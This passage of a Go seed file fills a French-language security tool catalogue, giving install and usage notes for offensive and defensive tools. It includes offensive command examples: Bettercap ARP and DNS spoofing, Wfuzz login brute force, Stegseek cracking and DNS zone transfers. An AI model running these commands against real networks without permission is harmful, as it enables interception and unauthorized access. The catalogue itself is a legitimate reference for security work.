			Description: "Laboratoire web pour la manipulation de données (encodage, décodage, chiffrement, déchiffrement, extraction de sous-chaînes, etc.). Outil indispensable pour l'analyse de données binaires, logs, ou artefacts.",
			Install:     "**Site** : https://gchq.github.io/CyberChef/\n\n**Auto-hébergement** :\n```bash\ngit clone https://github.com/gchq/CyberChef\ncd CyberChef && npm install && npm run build\n```",
			Usage:       "**Recettes** :\n- From Base64 → To Hex → From Hex\n- Regex extraction\n- AES Decrypt (avec clé)\n- Magic (détection automatique)\n\n**Fonctionnalités** :\n- Plus de 300 opérations\n- Glisser-déposer de fichiers\n- Enregistrement/partage de recettes",
			Examples:    "```javascript\n// Recette base64 -> hex -> ASCII\n[ \"From Base64\", \"To Hex\", \"From Hex\" ]\n```",
			Defense:     "",
		},
		{
			Name: "Recon-ng", Category: "offensive", SubCategory: "osint",
			EthicalLevel: models.EthicalStandard,
			OS:           "both", Tags: "osint,reconnaissance,framework,recon-ng",
			Description: "Framework OSINT complet avec des modules pour interroger des APIs publiques (Shodan, GitHub, HaveIBeenPwned, etc.). Permet une collecte automatisée d'informations sur des domaines, emails, contacts.",
			Install:     "```bash\ngit clone https://github.com/lanmaster53/recon-ng.git\ncd recon-ng && pip3 install -r REQUIREMENTS\n./recon-ng\n```",
			Usage:       "```bash\n# Dans la console recon-ng\nmarketplace search            # Chercher des modules\nmarketplace install <module>  # Installer un module\nworkspace create exemple      # Créer un workspace\nuse recon/domains-hosts/brute_hosts\nshow options\nset SOURCE example.com\nrun\n```",
			Examples:    "```bash\n# Collecte d'emails via github\nworkspace create target\nuse recon/contacts-contacts/github\nset SOURCE example.com\nrun\n```",
			Defense:     "",
		},
		{
			Name: "Radare2", Category: "offensive", SubCategory: "reverse-engineering",
			EthicalLevel: models.EthicalStandard,
			OS:           "both", Tags: "reverse,debug,disassemble,radare,malware,binaries",
			Description: "Framework de reverse engineering en ligne de commande. Désassembleur, débogueur, analyse de binaires, émulation, scripting. Alternative légère à Ghidra/IDA Pro.",
			Install:     "```bash\n# Linux\nsudo apt install radare2\n\n# Cutter (interface graphique)\nsudo apt install cutter\n```",
			Usage:       "```bash\nr2 ./binary\n\n# Commandes de base\naaa         # Analyse automatique\nafl         # Liste des fonctions\ns main      # Aller à main\npdf         # Désassembler fonction\nV           # Mode visual (graphique)\nVV          # Mode graphique\n/ strings   # Chercher une chaîne\ndc          # Run debugging\n```",
			Examples:    "```bash\n# Patch un binaire (changer un string)\nr2 -w binary\n/ oldpassword\nwa mov eax, 0\n\n# Désassembler un shellcode\nr2 -a x86 -b 32 shellcode.bin\n```",
			Defense:     "",
		},
		{
			Name: "Grafana", Category: "defensive", SubCategory: "siem-edr",
			EthicalLevel: models.EthicalStandard,
			OS:           "both", Tags: "visualisation,dashboard,logs,metrics,monitoring",
			Description: "Plateforme de visualisation de données. Utilisée pour créer des dashboards de sécurité à partir de sources comme Prometheus, Elasticsearch, Loki. Indispensable pour le SOC.",
			Install:     "```bash\n# Docker\ndocker run -d -p 3000:3000 grafana/grafana\n\n# Accès : admin/admin\n```",
			Usage:       "**Configuration** :\n1. Ajouter une data source (Prometheus, Loki, Elastic)\n2. Créer un dashboard avec des panneaux\n3. Importer des dashboards existants (ex: pour Suricata, Wazuh)",
			Examples:    "```bash\n# Dashboard pour logs Nginx\ndocker run -d -p 3000:3000 grafana/grafana\ncurl localhost:3000/api/dashboards/db\n```",
			Defense:     "",
		},
		{
			Name: "Velociraptor", Category: "defensive", SubCategory: "forensics",
			EthicalLevel: models.EthicalStandard,
			OS:           "both", Tags: "forensics,edr,hunting,velociraptor,dfir",
			Description: "Outil de réponse à incident et de chasse aux menaces. Permet de collecter des artefacts sur les endpoints (processus, fichiers, registre) via des agents temporaires ou permanents.",
			Install:     "```bash\n# Serveur\nwget https://github.com/Velocidex/velociraptor/releases\n./velociraptor --config server.config.yaml gui\n\n# Client\n./velociraptor --config client.config.yaml client\n```",
			Usage:       "**Interface web** : https://localhost:8889\n\n**VQL** (Velociraptor Query Language) :\n```sql\nSELECT Name, Pid FROM pslist() WHERE Name =~ 'powershell'\nSELECT * FROM glob(globs='C:\\Users\\*\\.ssh\\*')\n```",
			Examples:    "```sql\n-- Chercher des clés SSH\nSELECT * FROM glob(globs='/root/.ssh/*', accessor='file')\n\n-- Lister les processus avec connexions réseau\nSELECT * FROM pslist() WHERE Pid in (SELECT Pid FROM netstat())\n```",
			Defense:     "",
		},
		{
			Name: "TruffleHog", Category: "defensive", SubCategory: "devsecops",
			EthicalLevel: models.EthicalStandard,
			OS:           "both", Tags: "secrets,scan,github,credentials,leak",
			Description: "Scanner de secrets exposés dans des dépôts Git (historique, PR, diff). Détecte les clés API, tokens, mots de passe, et autres credentials avant qu'ils ne soient publiés.",
			Install:     "```bash\n# Docker\ndocker run -it -v \"$PWD:/pwd\" trufflesecurity/trufflehog github --repo https://github.com/user/repo\n\n# Go\ngo install github.com/trufflesecurity/trufflehog/v3@latest\n```",
			Usage:       "```bash\n# Scanner un repo public\ntrufflehog github --repo https://github.com/user/repo\n\n# Scanner un dossier local\ntrufflehog filesystem /mon/projet\n\n# Scanner les commits d'un dépôt local\ntrufflehog git file:///mon/repo --since-commit abc123\n```",
			Examples:    "```bash\n# Scanner tous les repos d'une organisation\nexport GITHUB_TOKEN=ghp_XXX\ntrufflehog github --org mon-org\n\n# Sortie JSON\ntrufflehog filesystem . --json\n```",
			Defense:     "**Utilisation** :\n- Intégrer dans les pipelines CI (pre-commit)\n- Scanner régulièrement l'historique Git\n- Configurer des webhooks GitHub pour détecter les secrets",
		},
		{
			Name: "Lynis", Category: "defensive", SubCategory: "audit",
			EthicalLevel: models.EthicalStandard,
			OS:           "linux", Tags: "audit,hardening,compliance,security-check",
			Description: "Outil d'audit de sécurité pour les systèmes Linux/Unix. Vérifie les configurations système, les permissions, les services, les mises à jour, et génère des recommandations de durcissement.",
			Install:     "```bash\n# Linux\nsudo apt install lynis\n```",
			Usage:       "```bash\nsudo lynis audit system\n\n# Options\n--quick         # Scan rapide\n--tests-from-group <group>  # Tests spécifiques (malware, network, storage)\n--cronjob       # Mode non-interactif pour cron\n```",
			Examples:    "```bash\n# Scan complet avec rapport\nsudo lynis audit system > rapport_lynis.txt\n\n# Vérifier seulement les mises à jour\nsudo lynis audit system --tests-from-group updates\n```",
			Defense:     "",
		},
		{
			Name: "Osquery", Category: "defensive", SubCategory: "edr",
			EthicalLevel: models.EthicalStandard,
			OS:           "both", Tags: "osquery,sql,monitoring,endpoint,events",
			Description: "Outil d'instrumentation de système d'exploitation permettant d'interroger l'état des endpoints en SQL (processus, fichiers, registre, connexions réseau). Idéal pour la chasse aux menaces.",
			Install:     "```bash\n# Linux\nsudo apt install osquery\n\n# Windows\nchoco install osquery\n```",
			Usage:       "```bash\n# Lancer osqueryi (shell interactif)\nosqueryi\n\n# Requêtes\nexplorer> SELECT name, pid, path FROM processes WHERE name LIKE '%powershell%';\nexplorer> SELECT * FROM listening_ports WHERE port=4444;\n\n# Mode daemon (collecte continue)\nosqueryd --config_path /etc/osquery/osquery.conf\n```",
			Examples:    "```sql\n-- Identifier les services installés récemment\nSELECT name, start_type, path FROM services WHERE start_time > strftime('%s', 'now') - 86400;\n\n-- Chercher des modifications des fichiers /etc/passwd\nSELECT * FROM file_events WHERE target_path='/etc/passwd';\n```",
			Defense:     "",
		},
		{
			Name: "Cuckoo Sandbox", Category: "defensive", SubCategory: "malware-analysis",
			EthicalLevel: models.EthicalStandard,
			OS:           "linux", Tags: "sandbox,malware,analysis,cuckoo,dynamic",
			Description: "Sandbox open source pour l'analyse dynamique de malware. Exécute des échantillons dans un environnement isolé (Windows) et rapporte les activités (fichiers, registre, réseau).",
			Install:     "```bash\n# Installation complexe (nécessite VirtualBox, KVM, etc.)\ngit clone https://github.com/cuckoosandbox/cuckoo\ncd cuckoo && pip install -r requirements.txt\n```",
			Usage:       "**Interface web** : http://localhost:8000\n\n**Envoi d'échantillon** :\n```bash\ncurl -F \"file=@malware.exe\" http://localhost:8090/tasks/create/file\n```",
			Examples:    "```bash\ncuckoo submit sample.exe\n\n# Attendre la fin\ncuckoo task --report <task_id>\n```",
			Defense:     "",
		},
		{
			Name: "RITA", Category: "defensive", SubCategory: "network",
			EthicalLevel: models.EthicalStandard,
			OS:           "linux", Tags: "zeek,bro,beaconing,network-analysis,blacklist",
			Description: "Real Intelligence Threat Analytics. Analyse les logs Zeek pour détecter des communications C2, du beaconing, des scans, et du tunneling DNS. Intègre une base de données Blacklist.",
			Install:     "```bash\ngit clone https://github.com/activecm/rita\ncd rita && ./install.sh\n```",
			Usage:       "```bash\n# Importer des logs Zeek (historique)\nrita import --dataset mon_analyse /chemin/vers/logs/zeek/\n\n# Lancer l'analyse\nrita analyze mon_analyse\n\n# Afficher les résultats\nrita show-beacons mon_analyse\n```",
			Examples:    "```bash\n# Détection de tunneling DNS\nrita show-dns mon_analyse --long\n\n# Export HTML\nrita html-report mon_analyse\n```",
			Defense:     "",
		},
		{
			Name: "Stegseek", Category: "offensive", SubCategory: "steganography",
			EthicalLevel: models.EthicalElevated,
			OS:           "both", Tags: "steganography,steghide,crack,jpg,password",
			Description: "Cracker de mots de passe pour Steghide. Très rapide, permet de récupérer le contenu caché dans des images JPEG/WAV. Utile en CTF et investigation.",
			Install:     "```bash\ngit clone https://github.com/RickdeJager/stegseek\ncd stegseek && make\n```",
			Usage:       "```bash\nstegseek image.jpg wordlist.txt\n\n# Options\n--crack       # Cracker seulement (pas de sortie)\n--seed        # Afficher la graine\n```",
			Examples:    "```bash\n# Crack avec rockyou\nstegseek secret.jpg /usr/share/wordlists/rockyou.txt\n\n# Extraire automatiquement\nstegseek --extract secret.jpg /wordlists/rockyou.txt\n```",
			Defense:     "",
		},
		{
			Name: "Wfuzz", Category: "offensive", SubCategory: "web",
			EthicalLevel: models.EthicalElevated,
			OS:           "both", Tags: "fuzzing,web,bruteforce,parameters,http",
			Description: "Fuzzer web flexible (Python). Permet d'énumérer répertoires, paramètres, valeurs, et d'effectuer du brute force sur formulaires. Supporte les cookies, les proxies, et les payloads multiples.",
			Install:     "```bash\npip3 install wfuzz\n```",
			Usage:       "```bash\nwfuzz -w wordlist.txt -u http://cible/FUZZ\n\n# Options\n-w payload   # Fichier\n-d \"user=FUZZ&pass=pass\"  # Pour POST\n-H \"Header: FUZZ\"\n--hc 404     # Cacher les 404\n--hh 4242    # Cacher par taille\n```",
			Examples:    "```bash\n# Fuzzing répertoires\nwfuzz -c -w /wordlists/common.txt --hc 404 http://10.10.10.1/FUZZ\n\n# Fuzzing paramètre GET\nwfuzz -w /wordlists/params.txt 'http://10.10.10.1/page.php?FUZZ=test'\n\n# Bruteforce login\nwfuzz -z file,users.txt -z file,passwords.txt -d \"user=FUZZ&pass=FUZ2Z\" http://10.10.10.1/login\n```",
			Defense:     "**Contre-mesures** :\n- Rate limiting\n- WAF\n- Cache 404 générique",
		},
		{
			Name: "LBD", Category: "offensive", SubCategory: "load-balancer",
			EthicalLevel: models.EthicalElevated,
			OS:           "linux", Tags: "load-balancer,network,detection,lb",
			Description: "Détecteur de load balancer (Layer 4/7). Identifie si un domaine répond depuis plusieurs IPs différentes ou présente des variations dans les réponses HTTP.",
			Install:     "```bash\ngit clone https://github.com/EnableSecurity/lbd\n```",
			Usage:       "```bash\n./lbd.sh domaine.com\n```",
			Examples:    "```bash\n./lbd.sh google.com\n```",
			Defense:     "",
		},
		{
			Name: "Dnsrecon", Category: "offensive", SubCategory: "dns",
			EthicalLevel: models.EthicalElevated,
			OS:           "both", Tags: "dns,enumeration,reconnaissance,records",
			Description: "Outil d'énumération DNS. Permet de lister les enregistrements (A, MX, NS, TXT, SPF), de faire des transferts de zone, des bruteforces de sous-domaines, et des récursions",
			Install:     "```bash\nsudo apt install dnsrecon\n```",
			Usage:       "```bash\ndnsrecon -d domaine.com\n\ndnsrecon -t axfr -d domaine.com   # Transfert de zone\ndnsrecon -t brt -d domaine.com -D /wordlists/subdomains.txt\n```",
			Examples:    "```bash\n# Enum complet\ndnsrecon -d exemple.com -t all\n\n# Bruteforce sous-domaines\ndnsrecon -d exemple.com -t brt -D /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt\n```",
			Defense:     "**Contre-mesures** :\n- Limiter les transferts de zone aux seules IPs autorisées\n- Masquer les informations de version DNS",
		},
		{
			Name: "WhatWeb", Category: "offensive", SubCategory: "web",
			EthicalLevel: models.EthicalElevated,
			OS:           "both", Tags: "web,technologies,detection,cms,server",
			Description: "Reconnaissance de technologies web. Identifie les serveurs web, frameworks, CMS, librairies JavaScript, et leurs versions.",
			Install:     "```bash\nsudo apt install whatweb\n```",
			Usage:       "```bash\nwhatweb site.com\n\n# Options\n--aggression 3   # Niveau de recherche (1-4)\n--proxy localhost:8080\n--header \"X-Custom: header\"\n```",
			Examples:    "```bash\nwhatweb -a 3 http://10.10.10.1\n\n# Export JSON\nwhatweb --log-json=result.json http://site\n```",
			Defense:     "",
		},
		{
			Name: "Scapy", Category: "offensive", SubCategory: "network",
			EthicalLevel: models.EthicalStandard,
			OS:           "both", Tags: "python,packet,network,crafting,scapy",
			Description: "Bibliothèque Python de manipulation de paquets réseau. Permet de créer, envoyer, écouter et analyser des paquets de n'importe quel protocole. Très utile pour l'ingénierie réseau et les tests de sécurité.",
			Install:     "```bash\npip3 install scapy\n```",
			Usage:       "```python\nfrom scapy.all import *\n\n# Envoyer un paquet ICMP\nsend(IP(dst=\"10.0.0.1\")/ICMP())\n\n# Scanner ARP\narp_request = ARP(pdst=\"192.168.1.0/24\")\nanswers, _ = srp(Ether(dst=\"ff:ff:ff:ff:ff:ff\")/arp_request, timeout=2)\n```",
			Examples:    "```bash\n# Example script pour sniff DNS\nsniff(filter=\"udp port 53\", prn=lambda x: x.summary(), count=10)\n```",
			Defense:     "",
		},
		{
			Name: "Bettercap", Category: "offensive", SubCategory: "network",
			EthicalLevel: models.EthicalWarning,
			OS:           "both", Tags: "mitm,arp-spoofing,network,dns-spoofing,ble",
			Description: "Framework d'attaque réseau (MITM, ARP spoofing, DNS spoofing, sniffing, BLE). Successeur moderne d'Ettercap. Très actif et extensible.",
			Install:     "```bash\nsudo apt install bettercap\n```",
			Usage:       "```bash\nsudo bettercap -eval \"set arp.spoof.targets 192.168.1.10; arp.spoof on; net.sniff on\"\n```",
			Examples:    "```bash\n# Lancer l'interface web (http://127.0.0.1:80)\nsudo bettercap -eval \"http-ui\"\n\n# DNS spoofing\nset dns.spoof.domains example.com\nset dns.spoof.address 10.0.0.1\ndns.spoof on\n```",
			Defense:     "**Détection** :\n- Monitoring ARP (arpwatch)\n- Port security (Cisco, etc.)\n- IPv6 et detection de rogue DHCP",
		},
		{
			Name: "Zeek (ex-Bro)", Category: "defensive", SubCategory: "ids-ips",
			EthicalLevel: models.EthicalStandard,
			OS:           "linux", Tags: "zeek,bro,network-monitoring,ids,analysis",
			Description: "Framework d'analyse réseau (IDS/IPS passif). Génère des logs structurés (HTTP, DNS, SMTP, etc.) et permet la détection de comportements anormaux via des scripts.",
			Install:     "```bash\nsudo apt install zeek\n```",
			Usage:       "```bash\nzeek -r capture.pcap\n\n# Scripts maison\nzeek -r capture.pcap detect-beacon.zeek\n```",
			Examples:    "```bash\n# Interface réseau en temps réel\nzeek -i eth0\n\n# Lire les logs générés\ncat conn.log\ncat http.log | zeek-cut method host\n```",
			Defense:     "",
		},
		{
			Name: "SQLite Forensic Browser", Category: "defensive", SubCategory: "forensics",
			EthicalLevel: models.EthicalStandard,
			OS:           "both", Tags: "sqlite,forensics,db,analysis",
			Description: "Outil forensique pour explorer les bases SQLite (fichiers .db, .sqlite, .sqlite3). Permet de visualiser les tables, de récupérer des enregistrements supprimés, d'exécuter des requêtes.",
			Install:     "```bash\n# Outil graphique : https://sqlitebrowser.org/\nsudo apt install sqlitebrowser\n```",
			Usage:       "**Open file** → sélectionner un fichier SQLite → naviguer dans les tables, exécuter des requêtes personnalisées.\n\n**Récupérer des données supprimées** : Activer \"Carve deleted rows\"",
			Examples:    "```sql\nSELECT * FROM messages WHERE datetime(timestamp) > '2025-01-01';\n```",
			Defense:     "",
		},
		{
			Name: "AIDE", Category: "defensive", SubCategory: "file-integrity",
			EthicalLevel: models.EthicalStandard,
			OS:           "linux", Tags: "aide,fim,integrity,file-monitoring",
			Description: "Advanced Intrusion Detection Environment. Surveillance d'intégrité de fichiers (FIM). Crée une base de données des checksums des fichiers critiques et alerte en cas de modification.",
			Install:     "```bash\nsudo apt install aide\n```",
			Usage:       "```bash\n# Initialisation de la base de données\nsudo aideinit\nsudo mv /var/lib/aide/aide.db.new /var/lib/aide/aide.db\n\n# Vérification\nsudo aide --check\n\n# Mise à jour après modifications légitimes\nsudo aide --update\n```",
			Examples:    "```bash\n# Configuration personnalisée dans /etc/aide/aide.conf\n# Exemple : surveiller /etc/passwd et /bin\n/etc/passwd NORMAL\n/bin/.* NORMAL\n```",
			Defense:     "",
		},
		{
			Name: "Metabase", Category: "defensive", SubCategory: "siem-edr",
			EthicalLevel: models.EthicalStandard,
			OS:           "both", Tags: "bi,visualization,dashboard,analytics",
			Description: "Outil de Business Intelligence simple. Permet de créer des dashboards et des requêtes sur des bases de données SQL (y compris les logs SIEM stockés en DB).",
			Install:     "```bash\n# Docker\ndocker run -d -p 3000:3000 -e MB_DB_TYPE=h2 -e MB_DB_FILE=/metabase.db metabase/metabase\n```",
			Usage:       "**Ajouter une base de données** → créer des questions → construire des dashboards.\n\n**Cas d'usage SOC** : requêtes sur les logs stockés dans PostgreSQL ou SQLite pour visualiser les tendances.",
			Examples:    "```sql\nSELECT COUNT(*), severity FROM alerts GROUP BY severity ORDER BY COUNT(*) DESC;\n```",
			Defense:     "",
		},
	}

	for _, s := range seeds {
		// Unscoped pour trouver aussi les outils soft-deletés.
		// Si l'outil existe mais a été supprimé par l'utilisateur (DeletedAt set) → ne pas restaurer.
		var existing models.Tool
		result := DB.Unscoped().Where("name = ?", s.Name).First(&existing)
		if result.Error != nil {
			// N'existe pas du tout → créer
			if _, err := CreateTool(&s); err != nil {
				return err
			}
			continue
		}
		if existing.DeletedAt.Valid {
			// Supprimé intentionnellement par l'utilisateur → ne pas restaurer
			continue
		}
		updates := map[string]interface{}{}
		if existing.EthicalLevel != s.EthicalLevel {
			updates["ethical_level"] = s.EthicalLevel
		}
		// Si LegalNotes/EthicalUseCases vides côté DB et seed les fournit → injecter
		if existing.LegalNotes == "" && s.LegalNotes != "" {
			updates["legal_notes"] = s.LegalNotes
		}
		if existing.EthicalUseCases == "" && s.EthicalUseCases != "" {
			updates["ethical_use_cases"] = s.EthicalUseCases
		}
		if len(updates) > 0 {
			DB.Model(&existing).Updates(updates)
		}
	}
	return nil
}
